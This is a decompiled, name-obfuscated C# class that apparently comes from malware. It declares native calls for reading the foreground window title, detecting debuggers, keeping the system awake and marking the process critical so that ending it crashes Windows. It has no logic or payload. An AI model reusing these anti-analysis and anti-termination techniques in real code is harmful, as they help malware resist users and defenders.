using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SUYgleINIQBW
{
	// Token: 0x0200000B RID: 11
	public static class KwpextiUxFasyV
	{
		// Token: 0x06000038 RID: 56
		[DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
		public static extern IntPtr OjjITfxRBpgHGa();

		// Token: 0x06000039 RID: 57
		[DllImport("user32.dll", EntryPoint = "GetWindowText")]
		public static extern int gwHMSTxmodT(IntPtr DewvoGOvOkVpY, StringBuilder UBFnEnywzmfar, int eMIWupoVLUNog);

		// Token: 0x0600003A RID: 58
		[DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
		public static extern IntPtr XmkfoTsmsYUKxwupW(string XKQGkzOqUGR);

		// Token: 0x0600003B RID: 59
		[DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", ExactSpelling = true, SetLastError = true)]
		public static extern bool NmgzgVgkvEr(IntPtr luEFrmBTRR, ref bool SDgkwtLZpmWDQ);

		// Token: 0x0600003C RID: 60
		[DllImport("kernel32.dll", EntryPoint = "SetThreadExecutionState", SetLastError = true)]
		public static extern KwpextiUxFasyV.KmhgldBHwWC LMmTRbUbgC(KwpextiUxFasyV.KmhgldBHwWC AztVieQYwqnGEy);

		// Token: 0x0600003D RID: 61
		[DllImport("ntdll.dll", EntryPoint = "RtlSetProcessIsCritical", SetLastError = true)]
		public static extern void nYpwczHvzCMJKxI(uint bMRYlvoYXjS, uint LEbDBpHDNJgUg, uint QjmIbDWtGPL);

		// Token: 0x0200000C RID: 12
		public enum KmhgldBHwWC : uint
		{
			// Token: 0x04000020 RID: 32
			gSLOzEWpsllgc = 2147483648U,
			// Token: 0x04000021 RID: 33
			LRCANWGKTVxD = 2U,
			// Token: 0x04000022 RID: 34
			jYYBCfcsKiYfDW = 1U
		}
	}
}
